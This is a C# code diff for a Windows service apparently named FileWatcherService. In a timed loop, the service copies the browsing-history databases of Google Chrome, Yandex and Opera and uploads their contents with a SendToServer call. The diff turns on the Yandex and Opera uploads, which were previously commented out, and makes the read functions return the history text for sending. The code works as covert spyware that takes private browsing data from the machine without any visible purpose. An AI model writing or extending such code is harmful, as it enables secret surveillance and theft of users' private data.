@@ -264,10 +264,10 @@ namespace FileWatcherService
                     Thread.Sleep(60000);
                     copyHistoryGoogle();
                     SendToServer("google", ReadGoogleDataBase());
-                    //copyHistoryYandex();
-                    //ReadYandexDataBase();
-                    //copyHistoryOpera();
-                    //ReadOperaDataBase();
+                    copyHistoryYandex();
+                    SendToServer("yandex", ReadYandexDataBase());
+                    copyHistoryOpera();
+                    SendToServer("opera", ReadOperaDataBase());
 
 
 
@@ -377,7 +377,7 @@ namespace FileWatcherService
 
 
         const string YandexdatabaseName = @"D:\\historyYandex.db";
-        private void ReadYandexDataBase()
+        private string ReadYandexDataBase()
         {
             try
             {
@@ -441,12 +441,12 @@ namespace FileWatcherService
                             }
                         }
 
-                        RecordEntry(stringBuilder.ToString());
+                        return stringBuilder.ToString();
 
-                        using (FileStream f = new FileStream(tmpPath, FileMode.OpenOrCreate))
-                        {
-                            f.Write(Encoding.ASCII.GetBytes(DateTime.Now.ToString()), 0, DateTime.Now.ToString().Length);
-                        }
+                        //using (FileStream f = new FileStream(tmpPath, FileMode.OpenOrCreate))
+                        //{
+                        //    f.Write(Encoding.ASCII.GetBytes(DateTime.Now.ToString()), 0, DateTime.Now.ToString().Length);
+                        //}
                     }
                 }
             }
@@ -454,12 +454,13 @@ namespace FileWatcherService
             {
                 RecordEntry(ex.Message);
             }
+            return String.Empty;
         }
 
 
 
         const string OperadatabaseName = @"D:\\historyOpera.db";
-        private void ReadOperaDataBase()
+        private string ReadOperaDataBase()
         {
             try
             {
@@ -523,12 +524,12 @@ namespace FileWatcherService
                             }
                         }
 
-                        RecordEntry(stringBuilder.ToString());
+                        return stringBuilder.ToString();
 
-                        using (FileStream f = new FileStream(tmpPath, FileMode.OpenOrCreate))
-                        {
-                            f.Write(Encoding.ASCII.GetBytes(DateTime.Now.ToString()), 0, DateTime.Now.ToString().Length);
-                        }
+                        //using (FileStream f = new FileStream(tmpPath, FileMode.OpenOrCreate))
+                        //{
+                        //    f.Write(Encoding.ASCII.GetBytes(DateTime.Now.ToString()), 0, DateTime.Now.ToString().Length);
+                        //}
                     }
                 }
             }
@@ -536,6 +537,8 @@ namespace FileWatcherService
             {
                 RecordEntry(ex.Message);
             }
+
+            return String.Empty;
         }
 
 
